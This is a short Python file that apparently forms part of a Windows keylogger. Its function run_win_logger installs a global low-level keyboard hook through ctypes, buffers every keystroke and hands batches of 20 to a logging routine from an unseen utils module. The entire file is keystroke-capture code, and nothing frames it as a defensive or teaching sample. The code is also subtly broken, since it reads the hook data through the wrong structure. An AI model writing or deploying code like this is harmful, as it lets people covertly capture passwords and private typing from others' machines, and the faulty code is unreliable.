import ctypes
from ctypes import wintypes
from utils import finalize_log

def run_win_logger(stop_event):
    user32 = ctypes.windll.user32
    buffer = []
    
    def hook_proc(nCode, wParam, lParam):
        if stop_event.is_set(): return -1
        if nCode == 0 and wParam == 256: # WM_KEYDOWN
            kbd = ctypes.cast(lParam, ctypes.POINTER(wintypes.MSG))
            key = chr(kbd.contents.message)
            buffer.append(key)
            if len(buffer) >= 20:
                finalize_log("".join(buffer))
                buffer.clear()
        return user32.CallNextHookEx(None, nCode, wParam, lParam)
    
    callback = ctypes.CFUNCTYPE(wintypes.HRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)(hook_proc)
    hook_id = user32.SetWindowsHookExA(13, callback, None, 0)
    
    msg = wintypes.MSG()
    while not stop_event.is_set():
        if user32.PeekMessageA(ctypes.byref(msg), None, 0, 0, 1):
            user32.DispatchMessageA(ctypes.byref(msg))
    
    if buffer: finalize_log("".join(buffer))
    user32.UnhookWindowsHookEx(hook_id)
